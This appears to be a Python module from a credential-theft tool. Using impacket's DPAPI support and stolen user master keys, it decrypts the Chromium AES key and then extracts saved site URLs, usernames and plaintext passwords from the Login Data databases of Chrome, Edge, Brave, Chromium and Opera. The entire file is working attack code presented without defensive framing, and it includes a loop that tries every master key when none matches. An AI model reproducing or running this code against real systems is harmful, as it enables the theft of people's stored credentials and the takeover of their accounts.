import base64, json, os, sqlite3, tempfile, uuid
from impacket import dpapi as idpapi
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


BROWSER_PATHS = {
    'Chrome':   r'AppData\Local\Google\Chrome\User Data',
    'Edge':     r'AppData\Local\Microsoft\Edge\User Data',
    'Brave':    r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
    'Chromium': r'AppData\Local\Chromium\User Data',
    'Opera':    r'AppData\Roaming\Opera Software\Opera Stable',
}


def get_aes_key(local_state_bytes, masterkeys):
    data        = json.loads(local_state_bytes.decode('utf-8', errors='replace'))
    enc_key_b64 = data['os_crypt']['encrypted_key']
    raw_blob    = base64.b64decode(enc_key_b64)[5:]   # strip 5-byte "DPAPI" prefix

    blob = idpapi.DPAPI_BLOB(raw_blob)
    guid = str(uuid.UUID(bytes_le=bytes(blob['GuidMasterKey'])))
    mk   = masterkeys.get(guid)

    if mk is None:
        for mk in masterkeys.values():
            try:
                result = blob.decrypt(mk)
                if result is not None:
                    return bytes(result)
            except Exception:
                pass
        return None

    result = blob.decrypt(mk)
    return bytes(result) if result is not None else None


def decrypt_logins(login_data_bytes, aes_key):
    with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
        tmp.write(login_data_bytes)
        tmp_path = tmp.name
    try:
        conn = sqlite3.connect(tmp_path)
        rows = conn.execute(
            'SELECT origin_url, username_value, password_value FROM logins'
        ).fetchall()
        conn.close()
    finally:
        os.unlink(tmp_path)

    results = []
    for url, user, enc in rows:
        if not enc:
            continue
        try:
            if enc[:3] == b'v10':
                # Chrome 80+ format: b'v10' + 12-byte nonce + ciphertext+GCM tag
                pw = AESGCM(aes_key).decrypt(enc[3:15], enc[15:], None).decode('utf-8', errors='replace')
            else:
                pw = '<legacy DPAPI blob>'
        except Exception as e:
            pw = f'<err: {e}>'
        results.append((url, user, pw))
    return results
